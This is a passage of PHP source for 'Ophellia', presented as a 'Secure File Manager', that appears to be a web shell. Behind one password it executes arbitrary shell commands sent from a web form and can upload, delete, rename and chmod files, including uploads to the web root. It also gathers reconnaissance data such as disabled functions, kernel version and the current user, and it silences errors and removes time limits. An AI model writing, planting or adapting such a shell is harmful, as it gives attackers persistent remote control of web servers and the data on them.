                    <svg class="h-5 w-5 sm:h-6 sm:w-6 text-primary" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                        <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M8 9l3 3-3 3m5 0h3M5 20h14a2 2 0 002-2V6a2 2 0 00-2-2H5a2 2 0 00-2 2v12a2 2 0 002 2z"></path>
                    </svg>
                </div>
                Command Line
            </h2>
        </div>

        <div class="p-4 sm:p-6">
            <div class="mb-4 p-3 bg-surface-container rounded-xl border border-outline-variant">
                <span class="text-sm text-on-surface-variant">Working directory:</span>
                <span class="ml-2 text-sm font-mono text-on-surface break-all">$workingDirEsc</span>
            </div>

            <form method="post" class="mb-4">
                <div class="flex flex-col sm:flex-row gap-2">
                    <div class="flex-1">
                        <div class="relative">
                            <div class="absolute inset-y-0 left-0 pl-4 flex items-center pointer-events-none">
                                <span class="text-primary font-mono font-bold">$</span>
                            </div>
                            <input type="text" name="command" class="w-full pl-10 pr-4 py-3 bg-surface-container border border-outline-variant rounded-xl focus:outline-none focus:ring-2 focus:ring-primary text-on-surface placeholder-on-surface-variant transition-all font-mono text-sm" placeholder="Enter command (e.g., ls -la)" autocomplete="off">
                        </div>
                    </div>

                    <button type="submit" class="flex items-center justify-center px-5 py-3 bg-primary text-on-primary rounded-xl hover:bg-primary-hover transition-colors shadow-sm font-medium whitespace-nowrap">
                        <svg class="h-5 w-5 mr-2" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                            <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M13 10V3L4 14h7v7l9-11h-7z"></path>
                        </svg>
                        Execute
                    </button>
                </div>
            </form>

HTML;

    if (!empty($output)) {
        $outputEsc = htmlspecialchars($output);
        echo <<<HTML
            <div class="mt-4">
                <div class="flex items-center mb-3">
                    <div class="p-1.5 bg-surface-container-high rounded-lg mr-2">
                        <svg class="h-4 w-4 text-primary" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                            <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M9 12l2 2 4-4m6 2a9 9 0 11-18 0 9 9 0 0118 0z"></path>
                        </svg>
                    </div>
                    <h3 class="font-semibold text-on-surface">Output</h3>
                </div>
                <div class="bg-surface-container-highest text-primary p-4 rounded-xl overflow-auto max-h-[50vh] sm:max-h-[60vh] font-mono text-xs sm:text-sm leading-relaxed scrollbar-thin">
                    <pre class="whitespace-pre-wrap">$outputEsc</pre>
                </div>
            </div>
HTML;
    } else {
        echo <<<HTML
            <div class="p-6 bg-surface-container border border-outline-variant rounded-xl text-center">
                <div class="inline-flex items-center justify-center w-12 h-12 rounded-full bg-surface-container-high mb-3">
                    <svg class="h-6 w-6 text-on-surface-variant" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                        <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M8 9l3 3-3 3m5 0h3M5 20h14a2 2 0 002-2V6a2 2 0 00-2-2H5a2 2 0 00-2 2v12a2 2 0 002 2z"></path>
                    </svg>
                </div>
                <p class="text-on-surface-variant">Enter a command and press Execute</p>
            </div>
HTML;
    }

    echo <<<HTML
        </div>
    </div>
</div>
HTML;
}

function renameFile(string $file): void
{
    $dirname = dirname($file);

    if (isset($_POST['newname'])) {
        if (empty($_POST['newname'])) {
            showAlert("New name cannot be empty!", "error");
            displayRenameForm($file);
            return;
        }

        $newname = $dirname . DIRECTORY_SEPARATOR . $_POST['newname'];
        rename($file, $newname);

        $_POST = array();
        showAlert("File renamed successfully!", "success");
        fileManager($dirname);
        return;
    }

    displayRenameForm($file);
}

function displayRenameForm(string $file): void
{
    $dirname = dirname($file);
    $isDir = is_dir($file);
    $currentName = htmlspecialchars(basename($file));
    $dirnameEnc = encryptPath($dirname);
    $typeLabel = $isDir ? 'Directory' : 'File';

    echo <<<HTML
<div class="max-w-lg mx-auto">
    <div class="bg-surface rounded-2xl shadow-sm border border-outline-variant overflow-hidden">
        <div class="px-4 sm:px-6 py-4 border-b border-outline-variant bg-surface-container">
            <h2 class="text-lg sm:text-xl font-bold text-on-surface flex items-center">
                <div class="p-2 bg-surface rounded-xl shadow-sm mr-3">
                    <svg class="h-5 w-5 sm:h-6 sm:w-6 text-primary" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                        <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M15.232 5.232l3.536 3.536m-2.036-5.036a2.5 2.5 0 113.536 3.536L6.5 21.036H3v-3.572L16.732 3.732z"></path>
                    </svg>
                </div>
                Rename $typeLabel
            </h2>
        </div>

        <form method="post">
            <div class="p-4 sm:p-6 space-y-4">
                <div class="p-3 bg-surface-container rounded-xl border border-outline-variant">
                    <span class="text-sm text-on-surface-variant">Current name:</span>
                    <span class="ml-2 text-sm font-medium text-on-surface break-all">$currentName</span>
                </div>

                <div>
                    <label class="block text-sm font-medium text-on-surface mb-2">New Name</label>
                    <input type="text" name="newname" value="$currentName" class="w-full px-4 py-2.5 bg-surface border border-outline-variant rounded-xl focus:outline-none focus:ring-2 focus:ring-primary text-on-surface transition-shadow" required>
                </div>
            </div>

            <div class="px-4 sm:px-6 py-4 bg-surface-container border-t border-outline-variant flex flex-wrap gap-2">
                <button type="submit" class="flex items-center px-4 py-2.5 bg-primary text-on-primary rounded-xl hover:bg-primary-hover transition-colors shadow-sm font-medium">
                    <svg class="h-5 w-5 mr-2" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                        <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M5 13l4 4L19 7"></path>
                    </svg>
                    Rename
                </button>

                <a href="?cd=$dirnameEnc" class="flex items-center px-4 py-2.5 bg-surface-container-high text-on-surface rounded-xl hover:bg-surface-container-highest transition-colors shadow-sm font-medium">
                    <svg class="h-5 w-5 mr-2" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                        <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M6 18L18 6M6 6l12 12"></path>
                    </svg>
                    Cancel
                </a>
            </div>
        </form>
    </div>
</div>
HTML;
}

function chmodFile(string $file): void
{
    $dirname = dirname($file);

    if (isset($_POST['permission'])) {
        if (!preg_match('/^[0-7]{3,4}$/', $_POST['permission'])) {
            showAlert("Invalid permission format!", "error");
            displayChmodForm($file);
            return;
        }

        $permission = octdec($_POST['permission']);
        chmod($file, $permission);

        $_POST = array();
        showAlert("Permissions changed successfully!", "success");
        fileManager($dirname);
        return;
    }

    displayChmodForm($file);
}

function displayChmodForm(string $file): void
{
    $dirname = dirname($file);
    $isDir = is_dir($file);
    $currentPerms = substr(sprintf('%o', fileperms($file)), -4);
    $baseName = htmlspecialchars(basename($file));
    $dirnameEnc = encryptPath($dirname);

    echo <<<HTML
<div class="max-w-lg mx-auto">
    <div class="bg-surface rounded-2xl shadow-sm border border-outline-variant overflow-hidden">
        <div class="px-4 sm:px-6 py-4 border-b border-outline-variant bg-surface-container">
            <h2 class="text-lg sm:text-xl font-bold text-on-surface flex items-center">
                <div class="p-2 bg-surface rounded-xl shadow-sm mr-3">
                    <svg class="h-5 w-5 sm:h-6 sm:w-6 text-primary" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                        <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M12 15v2m-6 4h12a2 2 0 002-2v-6a2 2 0 00-2-2H6a2 2 0 00-2 2v6a2 2 0 002 2zm10-10V7a4 4 0 00-8 0v4h8z"></path>
                    </svg>
                </div>
                Change Permissions
            </h2>
        </div>

        <form method="post">
            <div class="p-4 sm:p-6 space-y-4">
                <div class="p-3 bg-surface-container rounded-xl border border-outline-variant space-y-1">
                    <div class="flex justify-between"><span class="text-sm text-on-surface-variant">File:</span><span class="text-sm font-medium text-on-surface truncate max-w-[200px]" title="$baseName">$baseName</span></div>
                    <div class="flex justify-between"><span class="text-sm text-on-surface-variant">Current:</span><span class="text-sm font-mono font-medium text-primary">$currentPerms</span></div>
                </div>

                <div>
                    <label class="block text-sm font-medium text-on-surface mb-2">New Permissions (octal)</label>
                    <input type="text" name="permission" value="$currentPerms" class="w-full px-4 py-2.5 bg-surface border border-outline-variant rounded-xl font-mono focus:outline-none focus:ring-2 focus:ring-primary text-on-surface transition-shadow" required pattern="[0-7]{3,4}" placeholder="e.g. 0755">
                </div>

                <div class="p-4 bg-surface-container-high border border-outline-variant rounded-xl text-sm">
                    <p class="font-semibold text-on-surface mb-2">Common permissions:</p>
                    <div class="space-y-2">
                        <div class="flex items-center justify-between"><span class="font-mono text-primary bg-surface px-2 py-0.5 rounded">0755</span><span class="text-on-surface-variant">Directory (drwxr-xr-x)</span></div>
                        <div class="flex items-center justify-between"><span class="font-mono text-primary bg-surface px-2 py-0.5 rounded">0644</span><span class="text-on-surface-variant">File (-rw-r--r--)</span></div>
                        <div class="flex items-center justify-between"><span class="font-mono text-primary bg-surface px-2 py-0.5 rounded">0777</span><span class="text-on-surface-variant">Full access</span></div>
                    </div>
                </div>
            </div>

            <div class="px-4 sm:px-6 py-4 bg-surface-container border-t border-outline-variant flex flex-wrap gap-2">
                <button type="submit" class="flex items-center px-4 py-2.5 bg-primary text-on-primary rounded-xl hover:bg-primary-hover transition-colors shadow-sm font-medium">
                    <svg class="h-5 w-5 mr-2" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                        <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M5 13l4 4L19 7"></path>
                    </svg>
                    Change
                </button>

                <a href="?cd=$dirnameEnc" class="flex items-center px-4 py-2.5 bg-surface-container-high text-on-surface rounded-xl hover:bg-surface-container-highest transition-colors shadow-sm font-medium">
                    <svg class="h-5 w-5 mr-2" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                        <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M6 18L18 6M6 6l12 12"></path>
                    </svg>
                    Cancel
                </a>
            </div>
        </form>
    </div>
</div>
HTML;
}

function deleteFile(string $file): bool
{
    $isDir = is_dir($file);

    if ($isDir) {
        $success = deleteDirectory($file);
    } else {
        $success = @unlink($file);
    }

    return $success;
}

function deleteDirectory(string $dir): bool
{
    if (!is_dir($dir)) {
        return false;
    }

    $objects = scandir($dir);
    foreach ($objects as $object) {
        if ($object !== '.' && $object !== '..') {
            $path = $dir . DIRECTORY_SEPARATOR . $object;
            if (is_dir($path)) {
                deleteDirectory($path);
            } else {
                @unlink($path);
            }
        }
    }

    return @rmdir($dir);
}

function fileManager(string $dir): void
{
    echo '<div id="file-manager-content">';
    echo renderFileTable($dir);
    echo '</div>';
}

session_start();
error_reporting(0);
set_time_limit(0);
ini_set('memory_limit', '256M');

if (isset($_GET['logout'])) {
    session_destroy();
    header('Location: ?');
    exit;
}

if (isset($_POST['ajax_delete'])) {
    if (authenticate()) {
        $file = decryptPath($_POST['path']);
        $dirname = dirname($file);
        $isDir = is_dir($file);
        $success = deleteFile($file);

        $message = ($isDir ? "Directory" : "File") . ($success ? " deleted successfully" : " deletion failed");

        header('Content-Type: application/json');
        echo json_encode([
            'success' => $success,
            'message' => $message,
            'fileTableHtml' => renderFileTable($dirname)
        ]);
    } else {
        header('Content-Type: application/json');
        echo json_encode([
            'success' => false,
            'message' => 'Authentication failed'
        ]);
    }
    exit;
}

if (isset($_POST['ajax_rename'])) {
    if (authenticate()) {
        $file = decryptPath($_POST['path']);
        $dirname = dirname($file);
        $newname = $_POST['newname'] ?? '';

        if (empty($newname)) {
            header('Content-Type: application/json');
            echo json_encode([
                'success' => false,
                'message' => 'New name cannot be empty'
            ]);
            exit;
        }

        $newPath = $dirname . DIRECTORY_SEPARATOR . $newname;
        $success = rename($file, $newPath);
        $isDir = is_dir($newPath);

        header('Content-Type: application/json');
        echo json_encode([
            'success' => $success,
            'message' => ($isDir ? "Directory" : "File") . ($success ? " renamed successfully" : " rename failed"),
            'fileTableHtml' => renderFileTable($dirname)
        ]);
    } else {
        header('Content-Type: application/json');
        echo json_encode([
            'success' => false,
            'message' => 'Authentication failed'
        ]);
    }
    exit;
}

if (isset($_POST['ajax_chmod'])) {
    if (authenticate()) {
        $file = decryptPath($_POST['path']);
        $dirname = dirname($file);
        $permission = $_POST['permission'] ?? '';

        if (!preg_match('/^[0-7]{3,4}$/', $permission)) {
            header('Content-Type: application/json');
            echo json_encode([
                'success' => false,
                'message' => 'Invalid permission format'
            ]);
            exit;
        }

        $success = chmod($file, octdec($permission));

        header('Content-Type: application/json');
        echo json_encode([
            'success' => $success,
            'message' => $success ? "Permissions changed successfully" : "Failed to change permissions",
            'fileTableHtml' => renderFileTable($dirname)
        ]);
    } else {
        header('Content-Type: application/json');
        echo json_encode([
            'success' => false,
            'message' => 'Authentication failed'
        ]);
    }
    exit;
}

if (isset($_POST['ajax_newfile'])) {
    if (authenticate()) {
        $dir = decryptPath($_POST['path']);
        $filename = $_POST['filename'] ?? '';
        $content = $_POST['content'] ?? '';

        if (empty($filename)) {
            header('Content-Type: application/json');
            echo json_encode([
                'success' => false,
                'message' => 'Filename cannot be empty'
            ]);
            exit;
        }

        $filepath = $dir . DIRECTORY_SEPARATOR . $filename;
        $success = file_put_contents($filepath, $content) !== false;

        header('Content-Type: application/json');
        echo json_encode([
            'success' => $success,
            'message' => $success ? "File created successfully" : "Failed to create file",
            'fileTableHtml' => renderFileTable($dir)
        ]);
    } else {
        header('Content-Type: application/json');
        echo json_encode([
            'success' => false,
            'message' => 'Authentication failed'
        ]);
    }
    exit;
}

if (isset($_POST['ajax_newfolder'])) {
    if (authenticate()) {
        $dir = decryptPath($_POST['path']);
        $foldername = $_POST['foldername'] ?? '';

        if (empty($foldername)) {
            header('Content-Type: application/json');
            echo json_encode([
                'success' => false,
                'message' => 'Folder name cannot be empty'
            ]);
            exit;
        }

        $folderpath = $dir . DIRECTORY_SEPARATOR . $foldername;
        $success = mkdir($folderpath, 0755, true);

        header('Content-Type: application/json');
        echo json_encode([
            'success' => $success,
            'message' => $success ? "Folder created successfully" : "Failed to create folder",
            'fileTableHtml' => renderFileTable($dir)
        ]);
    } else {
        header('Content-Type: application/json');
        echo json_encode([
            'success' => false,
            'message' => 'Authentication failed'
        ]);
    }
    exit;
}

if (isset($_POST['ajax_command'])) {
    if (authenticate()) {
        $dir = decryptPath($_POST['path']);
        $command = $_POST['command'] ?? '';

        if (empty($command)) {
            header('Content-Type: application/json');
            echo json_encode([
                'success' => false,
                'message' => 'Command cannot be empty'
            ]);
            exit;
        }

        chdir($dir);
        $output = getFunctionalCmd($command);

        header('Content-Type: application/json');
        echo json_encode([
            'success' => true,
            'output' => $output
        ]);
    } else {
        header('Content-Type: application/json');
        echo json_encode([
            'success' => false,
            'message' => 'Authentication failed'
        ]);
    }
    exit;
}

if (isset($_POST['ajax_upload'])) {
    header('Content-Type: application/json');

    if (!authenticate()) {
        echo json_encode([
            'success' => false,
            'message' => 'Authentication failed'
        ]);
        exit;
    }

    $uploadToRoot = isset($_POST['upload_to_root']) && $_POST['upload_to_root'] === '1';
    $rootPath = getcwd();
    $targetDir = $uploadToRoot ? $rootPath : decryptPath($_POST['path'] ?? $rootPath);

    if (!is_dir($targetDir) || !is_writable($targetDir)) {
        echo json_encode([
            'success' => false,
            'message' => 'Target directory is not writable'
        ]);
        exit;
    }

    if (!isset($_FILES['file']) || $_FILES['file']['error'] !== UPLOAD_ERR_OK) {
        $error = $_FILES['file']['error'] ?? UPLOAD_ERR_NO_FILE;
        $errorMsg = [
            UPLOAD_ERR_INI_SIZE => 'File too large (php.ini limit)',
            UPLOAD_ERR_FORM_SIZE => 'File too large (form limit)',
            UPLOAD_ERR_PARTIAL => 'Partial upload',
            UPLOAD_ERR_NO_FILE => 'No file uploaded',
            UPLOAD_ERR_NO_TMP_DIR => 'No temp folder',
            UPLOAD_ERR_CANT_WRITE => 'Write failed',
            UPLOAD_ERR_EXTENSION => 'Upload blocked'
        ][$error] ?? 'Upload failed';

        echo json_encode([
            'success' => false,
            'message' => $errorMsg
        ]);
        exit;
    }

    $filename = basename($_FILES['file']['name']);
    $targetPath = $targetDir . '/' . $filename;

    if (file_exists($targetPath)) {
        $name = pathinfo($filename, PATHINFO_FILENAME);
        $ext = pathinfo($filename, PATHINFO_EXTENSION);
        $filename = $name . '_' . time() . '.' . $ext;
        $targetPath = $targetDir . '/' . $filename;
    }

    if (move_uploaded_file($_FILES['file']['tmp_name'], $targetPath)) {
        echo json_encode([
            'success' => true,
            'message' => 'Uploaded: ' . $filename
        ]);
    } else {
        echo json_encode([
            'success' => false,
            'message' => 'Failed to save file'
        ]);
    }
    exit;
}

if (isset($_POST['ajax_info'])) {
    header('Content-Type: application/json');

    if (!authenticate()) {
        echo json_encode([
            'success' => false,
            'message' => 'Authentication failed'
        ]);
        exit;
    }

    try {
        $info = [];

        $safeMode = ini_get('safe_mode');
        $info['php'] = [
            'version' => PHP_VERSION,
            'sapi' => php_sapi_name(),
            'extensions' => get_loaded_extensions(),
            'ini_path' => php_ini_loaded_file() ?: 'N/A',
            'memory_limit' => ini_get('memory_limit') ?: 'N/A',
            'max_execution_time' => ini_get('max_execution_time') ?: '0',
            'upload_max_filesize' => ini_get('upload_max_filesize') ?: 'N/A',
            'post_max_size' => ini_get('post_max_size') ?: 'N/A',
            'display_errors' => ini_get('display_errors') ?: '0',
            'error_reporting' => error_reporting(),
            'safe_mode' => $safeMode && $safeMode !== '' && $safeMode !== '0' ? 'On' : 'Off',
        ];

        $info['server'] = [
            'software' => $_SERVER['SERVER_SOFTWARE'] ?? 'N/A',
            'name' => $_SERVER['SERVER_NAME'] ?? 'N/A',
            'protocol' => $_SERVER['SERVER_PROTOCOL'] ?? 'N/A',
            'document_root' => $_SERVER['DOCUMENT_ROOT'] ?? 'N/A',
            'remote_addr' => $_SERVER['REMOTE_ADDR'] ?? 'N/A',
            'server_addr' => $_SERVER['SERVER_ADDR'] ?? 'N/A',
        ];

        $uname = @php_uname('a') ?: 'N/A';
        $kernelParts = explode(' ', $uname);
        $kernel = isset($kernelParts[2]) ? $kernelParts[2] : ($kernelParts[0] ?? 'N/A');

        $info['system'] = [
            'os' => PHP_OS,
            'os_family' => defined('PHP_OS_FAMILY') ? PHP_OS_FAMILY : PHP_OS,
            'hostname' => @gethostname() ?: 'N/A',
            'uname' => $uname,
            'kernel' => $kernel,
            'current_user' => @get_current_user() ?: 'N/A',
            'current_dir' => @getcwd() ?: 'N/A',
            'temp_dir' => @sys_get_temp_dir() ?: 'N/A',
        ];

        $diskTotal = @disk_total_space('/');
        $diskFree = @disk_free_space('/');
        $info['disk'] = [
            'total' => $diskTotal ? formatSize((int) $diskTotal) : 'N/A',
            'free' => $diskFree ? formatSize((int) $diskFree) : 'N/A',
        ];

        $dbExtensions = ['mysqli', 'pdo_mysql', 'pgsql', 'pdo_pgsql', 'sqlite3', 'pdo_sqlite', 'mongodb'];
        $info['databases'] = array_values(array_filter($dbExtensions, 'extension_loaded'));

        $disabledFunctions = ini_get('disable_functions');
        $info['disabled_functions'] = $disabledFunctions ? array_map('trim', explode(',', $disabledFunctions)) : [];

        echo json_encode([
            'success' => true,
            'info' => $info
        ]);
    } catch (Exception $e) {
        echo json_encode([
            'success' => false,
            'message' => 'Error: ' . $e->getMessage()
        ]);
    }
    exit;
}

if (isset($_GET['download'])) {
    $file = decryptPath($_GET['download']);
    downloadFile($file);
    exit;
}

if (!authenticate()) {
    $loginTheme = THEME === 'dark' ? [
        'bg' => '#1A110F',
        'surface' => '#271D1A',
        'surfaceContainer' => '#322825',
        'text' => '#F1DFD9',
        'textVariant' => '#D8C2BB',
        'primary' => '#FFB59C',
        'primaryHover' => '#E7A08A',
        'onPrimary' => '#55200C',
        'border' => '#53433F',
    ] : [
        'bg' => '#FFF8F6',
        'surface' => '#FFFFFF',
        'surfaceContainer' => '#FCEAE5',
        'text' => '#231917',
        'textVariant' => '#53433F',
        'primary' => '#8F4C35',
        'primaryHover' => '#723520',
        'onPrimary' => '#FFFFFF',
        'border' => '#D8C2BB',
    ];
    echo '<!DOCTYPE html>
    <html lang="en">
    <head>
        <meta charset="UTF-8">
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <title>Authentication</title>
        <script src="https://cdn.tailwindcss.com"></script>
        <style>
            body { background-color: ' . $loginTheme['bg'] . '; }
        </style>
    </head>
    <body class="flex items-center justify-center min-h-screen">
        <div style="background-color: ' . $loginTheme['surface'] . '; border: 1px solid ' . $loginTheme['border'] . ';" class="p-8 rounded-lg shadow-xl w-96 max-w-md">
            <div class="text-center mb-8">
                <svg class="h-16 w-16 mx-auto mb-4" style="color: ' . $loginTheme['primary'] . ';" viewBox="0 0 600 530" fill="currentColor">
                    <path d="m135.72 44.03c66.496 49.921 138.02 151.14 164.28 205.46 26.262-54.316 97.782-155.54 164.28-205.46 47.98-36.021 125.72-63.892 125.72 24.795 0 17.712-10.155 148.79-16.111 170.07-20.703 73.984-96.144 92.854-163.25 81.433 117.3 19.964 147.14 86.092 82.697 152.22-122.39 125.59-175.91-31.511-189.63-71.766-2.514-7.3797-3.6904-10.832-3.7077-7.8964-0.0174-2.9357-1.1937 0.51669-3.7077 7.8964-13.714 40.255-67.233 197.36-189.63 71.766-64.444-66.128-34.605-132.26 82.697-152.22-67.108 11.421-142.55-7.4491-163.25-81.433-5.9562-21.282-16.111-152.36-16.111-170.07 0-88.687 77.742-60.816 125.72-24.795z"/>
                </svg>
            </div>

            <form method="post" action="">
                <div class="mb-5">
                    <label for="password" style="color: ' . $loginTheme['text'] . ';" class="block font-medium mb-2">Password</label>
                    <div class="relative">
                        <div class="absolute inset-y-0 left-0 pl-3 flex items-center pointer-events-none">
                            <svg style="color: ' . $loginTheme['textVariant'] . ';" class="h-5 w-5" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                                <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M12 15v2m-6 4h12a2 2 0 002-2v-6a2 2 0 00-2-2H6a2 2 0 00-2 2v6a2 2 0 002 2zm10-10V7a4 4 0 00-8 0v4h8z"></path>
                            </svg>
                        </div>
                        <input type="password" id="password" name="password" style="background-color: ' . $loginTheme['surfaceContainer'] . '; border-color: ' . $loginTheme['border'] . '; color: ' . $loginTheme['text'] . ';" class="pl-10 w-full p-3 border rounded-lg focus:outline-none focus:ring-2" placeholder="Enter password" autofocus>
                    </div>
                </div>
                <button type="submit" style="background-color: ' . $loginTheme['primary'] . '; color: ' . $loginTheme['onPrimary'] . ';" class="w-full py-3 rounded-lg hover:opacity-90 transition-opacity flex items-center justify-center">
                    <svg class="h-5 w-5 mr-2" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                        <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M11 16l-4-4m0 0l4-4m-4 4h14m-5 4v1a3 3 0 01-3 3H6a3 3 0 01-3-3V7a3 3 0 013-3h7a3 3 0 013 3v1"></path>
                    </svg>
                    Login
                </button>
            </form>
        </div>
    </body>
    </html>';
    exit;
}

$currentDir = isset($_GET['cd']) ? decryptPath($_GET['cd']) : getcwd();
if (!file_exists($currentDir) || !is_dir($currentDir)) {
    $currentDir = getcwd();
}

$currentUser = getCurrentUser();
$currentTime = date('Y-m-d H:i:s');

?>
<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Ophellia
        <?= VERSION ?>
    </title>
    <script src="https://cdn.tailwindcss.com"></script>
    <link rel="stylesheet" href="ophellia.css">
    <?php
    $themeColors = THEME === 'dark' ? [
        'background' => '#1A110F',
        'surface' => '#1A110F',
        'surface-dim' => '#1A110F',
        'surface-container-lowest' => '#140C0A',
        'surface-container-low' => '#231917',
        'surface-container' => '#271D1A',
        'surface-container-high' => '#322825',
        'surface-container-highest' => '#3D322F',
        'surface-bright' => '#423733',
        'on-background' => '#F1DFD9',
        'on-surface' => '#F1DFD9',
        'on-surface-variant' => '#D8C2BB',
        'outline' => '#A08D87',
        'outline-variant' => '#53433F',
        'primary' => '#FFB59C',
        'primary-hover' => '#E7A08A',
        'on-primary' => '#55200C',
        'error' => '#FFB4AB',
        'on-error' => '#690005',
        'error-container' => '#93000A',
        'on-error-container' => '#FFDAD6',
        'success' => '#D6C68D',
        'warning' => '#E7BDB0',
    ] : [
        'background' => '#FFF8F6',
        'surface' => '#FFF8F6',
        'surface-dim' => '#E8D6D1',
        'surface-container-lowest' => '#FFFFFF',
        'surface-container-low' => '#FFF1ED',
        'surface-container' => '#FCEAE5',
        'surface-container-high' => '#F7E4DF',
        'surface-container-highest' => '#F1DFD9',
        'surface-bright' => '#FFF8F6',
        'on-background' => '#231917',
        'on-surface' => '#231917',
        'on-surface-variant' => '#53433F',
        'outline' => '#85736E',
        'outline-variant' => '#D8C2BB',
        'primary' => '#8F4C35',
        'primary-hover' => '#723520',
        'on-primary' => '#FFFFFF',
        'error' => '#BA1A1A',
        'on-error' => '#FFFFFF',
        'error-container' => '#FFDAD6',
        'on-error-container' => '#410002',
        'success' => '#6A5E2F',
        'warning' => '#77574C',
    ];
    ?>
    <style>
        :root {
            --background:
                <?= $themeColors['background'] ?>
            ;
            --surface:
                <?= $themeColors['surface'] ?>
            ;
            --surface-container:
                <?= $themeColors['surface-container'] ?>
            ;
            --surface-container-high:
                <?= $themeColors['surface-container-high'] ?>
            ;
            --surface-container-highest:
                <?= $themeColors['surface-container-highest'] ?>
            ;
            --on-surface:
                <?= $themeColors['on-surface'] ?>
            ;
            --on-surface-variant:
                <?= $themeColors['on-surface-variant'] ?>
            ;
            --outline:
                <?= $themeColors['outline'] ?>
            ;
            --outline-variant:
                <?= $themeColors['outline-variant'] ?>
            ;
            --primary:
                <?= $themeColors['primary'] ?>
            ;
            --on-primary:
                <?= $themeColors['on-primary'] ?>
            ;
            --error:
                <?= $themeColors['error'] ?>
            ;
            --on-error:
                <?= $themeColors['on-error'] ?>
            ;
            --error-container:
                <?= $themeColors['error-container'] ?>
            ;
            --on-error-container:
                <?= $themeColors['on-error-container'] ?>
            ;
            --success:
                <?= $themeColors['success'] ?>
            ;
        }
    </style>
    <script>
        tailwind.config = {
            theme: {
                extend: {
                    colors: {
                        'background': '<?= $themeColors['background'] ?>',
                        'surface': '<?= $themeColors['surface'] ?>',
                        'surface-dim': '<?= $themeColors['surface-dim'] ?>',
                        'surface-container-lowest': '<?= $themeColors['surface-container-lowest'] ?>',
                        'surface-container-low': '<?= $themeColors['surface-container-low'] ?>',
                        'surface-container': '<?= $themeColors['surface-container'] ?>',
                        'surface-container-high': '<?= $themeColors['surface-container-high'] ?>',
                        'surface-container-highest': '<?= $themeColors['surface-container-highest'] ?>',
                        'surface-bright': '<?= $themeColors['surface-bright'] ?>',
                        'on-background': '<?= $themeColors['on-background'] ?>',
                        'on-surface': '<?= $themeColors['on-surface'] ?>',
                        'on-surface-variant': '<?= $themeColors['on-surface-variant'] ?>',
                        'outline': '<?= $themeColors['outline'] ?>',
                        'outline-variant': '<?= $themeColors['outline-variant'] ?>',
                        'primary': '<?= $themeColors['primary'] ?>',
                        'primary-hover': '<?= $themeColors['primary-hover'] ?>',
                        'on-primary': '<?= $themeColors['on-primary'] ?>',
                        'error': '<?= $themeColors['error'] ?>',
                        'on-error': '<?= $themeColors['on-error'] ?>',
                        'success': '<?= $themeColors['success'] ?>',
                        'warning': '<?= $themeColors['warning'] ?>',
                    }
                }
            }
        }
    </script>
</head>

<body class="bg-background min-h-screen flex flex-col">
    <div id="alertContainer" class="alert-container"></div>

    <div id="actionModal" class="modal">
        <div class="modal-content" id="modalContent">
        </div>
    </div>

    <header class="bg-surface-container-high text-on-surface shadow-lg sticky top-0 z-50">
        <div class="container mx-auto px-4 py-4">
            <div class="flex flex-col sm:flex-row justify-between items-start sm:items-center gap-3">
                <div class="flex items-center">
                    <div class="p-2 bg-surface-container-highest rounded-xl mr-3">
                        <svg class="h-6 w-6 text-primary" viewBox="0 0 600 530" fill="currentColor">
                            <path
                                d="m135.72 44.03c66.496 49.921 138.02 151.14 164.28 205.46 26.262-54.316 97.782-155.54 164.28-205.46 47.98-36.021 125.72-63.892 125.72 24.795 0 17.712-10.155 148.79-16.111 170.07-20.703 73.984-96.144 92.854-163.25 81.433 117.3 19.964 147.14 86.092 82.697 152.22-122.39 125.59-175.91-31.511-189.63-71.766-2.514-7.3797-3.6904-10.832-3.7077-7.8964-0.0174-2.9357-1.1937 0.51669-3.7077 7.8964-13.714 40.255-67.233 197.36-189.63 71.766-64.444-66.128-34.605-132.26 82.697-152.22-67.108 11.421-142.55-7.4491-163.25-81.433-5.9562-21.282-16.111-152.36-16.111-170.07 0-88.687 77.742-60.816 125.72-24.795z" />
                        </svg>
                    </div>
                    <div>
                        <h1 class="text-xl font-bold tracking-tight">Ophellia <span
                                class="opacity-75 font-normal text-primary">
                                <?= VERSION ?>
                            </span></h1>
                        <p class="text-xs text-on-surface-variant hidden sm:block">Secure File Manager</p>
                    </div>
                </div>
                <div class="flex items-center gap-4 text-sm">
                    <a href="?cd=<?= encryptPath(getcwd()) ?>"
                        class="flex items-center px-3 py-1.5 bg-surface-container-highest rounded-lg hover:bg-primary hover:text-on-primary transition-colors">
                        <svg class="h-4 w-4 mr-1.5" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                            <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2"
                                d="M3 12l2-2m0 0l7-7 7 7M5 10v10a1 1 0 001 1h3m10-11l2 2m-2-2v10a1 1 0 01-1 1h-3m-6 0a1 1 0 001-1v-4a1 1 0 011-1h2a1 1 0 011 1v4a1 1 0 001 1m-6 0h6">
                            </path>
                        </svg>
                        Home
                    </a>
                    <a href="?logout=1"
                        class="flex items-center px-3 py-1.5 bg-error-container text-on-error-container rounded-lg hover:bg-error-container-hover transition-colors text-sm font-medium">
